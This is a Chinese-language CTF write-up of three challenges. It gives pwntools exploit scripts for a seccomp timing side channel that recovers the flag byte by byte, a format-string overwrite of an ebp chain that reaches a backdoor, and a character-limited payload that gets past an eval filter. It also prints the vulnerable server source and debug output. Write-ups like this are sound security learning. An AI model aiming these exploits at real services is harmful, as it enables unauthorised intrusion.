打ctf像吸毒一样，本来是要复习的，今天又是没复习的一天.jpg

# nooocall

题如其名，syscall都被干掉了

```c
unsigned __int64 sub_C34()
{
  unsigned __int64 v0; // ST08_8
  __int64 v1; // ST00_8

  v0 = __readfsqword(0x28u);
  v1 = seccomp_init(0LL);
  seccomp_load(v1);
  return __readfsqword(0x28u) ^ v0;
}
```

但是程序一开时把`flag`读到了`0x200000000`处，我们能写0x10字节的`shellcode`，所以就类似盲注那样一位一位的爆破出flag就好啦,（远程接收数据好像有点问题

exp:

```python
from pwn import *

context.arch="amd64"

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[3], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))


def main(host,port=10003):
	global p
	if host:
		# p = remote(host,port)
		pass
	else:
		# p = process("./chall")
		pass
		# gdb.attach(p,"b *0x0000000000400672")
		# debug(0x000000000000D87)
	flag = ''
	
	for i in range(0x0,0x40):
		for j in range(0x20,0x80):
			p = remote(host,port)
			p.recvuntil("Your Shellcode >>")
			payload = asm('''
				pop rbx
				pop rbx
				pop rbx
				pop rbx
			loop:
				cmp byte ptr[rbx+{}],{}
				jz loop
			'''.format(i,hex(j)))
			try:
				p.send(payload.ljust(0x30,'['))
				sleep(0.5)
				p.send('AA'*0x10)
				flag += chr(j)
				info(flag)
				p.close()
				break
			except:
				p.close()	
	# xmanctf{y0ur_she11c0de_i3_grea7}
if __name__ == "__main__":
	main(args['REMOTE'])
```

爆破现场：

```shell
	# [DEBUG] Sent 0x30 bytes:
    # 00000000  5b 5b 5b 5b  80 7b 17 69  74 fa 5b 5b  5b 5b 5b 5b  
    # 00000010  5b 5b 5b 5b  5b 5b 5b 5b  5b 5b 5b 5b  5b 5b 5b 5b  
    # *
    # 00000030
	# [DEBUG] Sent 0x20 bytes:
		# 'A' * 0x20
	# [*] y0ur_she11c0de_i
	# [*] Paused (press any to continue)
	# [1]  + 51595 suspended (signal)  python exp.py DEBUG REMOTE=121.36.64.245
```

# format

`0x80485AB`处为后门函数，漏洞是格式化字符串

利用多次调用残留在栈上的ebp链（

长这样：

```asm
pwndbg> stack 39
00:0000│ esp  0xffc1e350 —▸ 0x93f1014 ◂— '%34219c%18$hn'
01:0004│      0xffc1e354 —▸ 0x80487ac ◂— jl     0x80487ae /* '|' */
02:0008│      0xffc1e358 ◂— 0x0
03:000c│      0xffc1e35c —▸ 0xf7f18d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
04:0010│      0xffc1e360 —▸ 0xf7f18000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
05:0014│      0xffc1e364 —▸ 0xf7d6db08 ◂— in     al, 0x1f
06:0018│      0xffc1e368 —▸ 0x80487ac ◂— jl     0x80487ae /* '|' */
07:001c│      0xffc1e36c —▸ 0x93f1014 ◂— '%34219c%18$hn'
08:0020│      0xffc1e370 —▸ 0xf7f18000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
... ↓
0a:0028│ ebp  0xffc1e378 —▸ 0xffc1e398 —▸ 0xffc1e32c ◂— 0x0			!!
0b:002c│      0xffc1e37c —▸ 0x804864b ◂— add    esp, 0x10
0c:0030│      0xffc1e380 —▸ 0x93f1008 ◂— '%44c%10$hhn'
0d:0034│      0xffc1e384 —▸ 0xf7f52010 (_dl_runtime_resolve+16) ◂— pop    edx
0e:0038│      0xffc1e388 —▸ 0xffc1e3c8 —▸ 0xffc1e3d8 —▸ 0xffc1e3e8 ◂— 0x0		!!

```

爆破就好，几率还挺大的

exp：

```python
from pwn import *

def main(host,port=10005):
	global p
	if host:	
		pass
	else:
		# p = process("./chall")
		# gdb.attach(p,"b *0x8048606")
		pass
	for i in range(0x20):
		try:
			# p = process("./chall")
			p = remote("119.3.172.70",port)
			p.recvuntil("...")
			p.recvuntil("...")
			p.send("%44c%10$hhn|%34219c%18$hn|")
			p.sendline("echo 'ruan777'")
			p.recvuntil('777')
			p.interactive()
		except:
			p.close ()
if __name__ == "__main__":
	main(args['REMOTE'])
```

# ezppython

赛后复现，感谢xman队友关爱:smile:

```python
import random
import string
import SocketServer
from hashlib import sha256
import re
from flag import flag

the_key_to_flag = "flag?!@#"


class Task(SocketServer.BaseRequestHandler):
    def handle(self):
        req = self.request
        try:
            req.sendall("Give me key:")
            s = req.recv(6666).strip()
            if len(set(s)) > 7:
                req.sendall("bye~")
            elif re.match("\d|ord|exec|chr|all|var|flag", s):
                req.sendall("Too young!")
            else:
                val = eval(s)
                if val == the_key_to_flag:
                    req.sendall("Congratulations! Here is your flag: %s" % flag)
                else:
                    req.sendall("bye~")
        except:
            req.sendall("No magic")


class ThreadedServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass


if __name__ == "__main__":
    HOST, PORT = '0.0.0.0', 23333
    print 'Run in port:23333'
    server = ThreadedServer((HOST, PORT), Task)
    server.allow_reuse_address = True
    server.serve_forever()

```

题目流程很清晰，我们就是要构造一个字符串s,然后`eval(s)`后和`key`相等就好，当然啦，要过正则和`len(set(s)) <= 7`的限制

赛后队友给了个payload，瞬间明白了,orz

```python
>>> eval("'%c'%(1+1+1+1)+'%c'%(1+1+1+1)")
'\x04\x04'
>>> 
```

exp为：

```python
from pwn import *
key = "flag?!@#"
payload = ''
for i in key:
	payload += r"'%c'%("
	payload += '1+'*(ord(i)-1)+'1)'
	payload += '+'
payload = payload[:-1]

p = remote("127.0.0.1",23333)

p.recvuntil("Give me key:")
p.sendline(payload)
p.interactive()
```

